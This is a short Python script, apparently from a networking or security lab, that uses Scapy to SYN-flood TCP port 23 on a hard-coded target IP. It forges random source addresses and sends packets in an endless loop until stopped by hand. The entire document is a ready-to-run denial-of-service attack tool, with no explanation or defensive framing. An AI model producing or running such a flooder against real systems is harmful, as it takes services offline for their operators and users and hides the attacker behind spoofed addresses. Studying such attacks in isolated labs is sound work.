from scapy.all import *
from random import getrandbits

target_ip = "241.39.0.5"
sent_count = 1

print("Starting SYN Flooding Attack...")

while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   
   src_ip = a + "." + b + "." + c + "." + d
   ip = IP(src = src_ip, dst = target_ip)
   tcp = TCP(sport = getrandbits(16),flags="S", dport = 23)
   pkt = ip / tcp
   send(pkt, iface ='br-0ea6099d058a', verbose = 0)
   
   # print ("Sent "+ str(count) +" packet from "+ src_ip +" to "+ target_ip)
   sent_count = sent_count + 1
   
# To stop the attack press CTRL + C 
